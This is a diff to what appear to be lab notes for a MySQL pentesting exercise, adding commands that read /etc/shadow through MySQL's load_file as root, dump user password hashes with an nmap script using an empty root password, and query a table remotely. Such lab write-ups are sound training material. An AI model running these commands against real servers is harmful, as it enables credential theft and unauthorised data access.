@@ -43,8 +43,7 @@ auxiliary(scanner/mysql/mysql_file_enum)
 
 15.  Find the system password hash for user "root".
 ```
-nmap --script mysql-dump-hashes --script-args='username=root' -p 3306 192.12.132.3
-
+mysql -u root -h [id]
 select load_file('/etc/shadow');
 ```
 
@@ -86,6 +85,9 @@ nmap 192.12.132.3 -p 3306 --script=mysql-audit --script-args="mysql-audit.userna
 ```
 31.  Dump all user hashes using  nmap script.
 ```
-
+nmap --script mysql-dump-hashes --script-args='username=root,password=""' -p 3306 192.12.132.3
 ```
 33.  Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
+```
+nmap --script mysql-query --script-args="query ='select * from books.authors;'username=root,password=""' -p 3306 192.12.132.3
+```
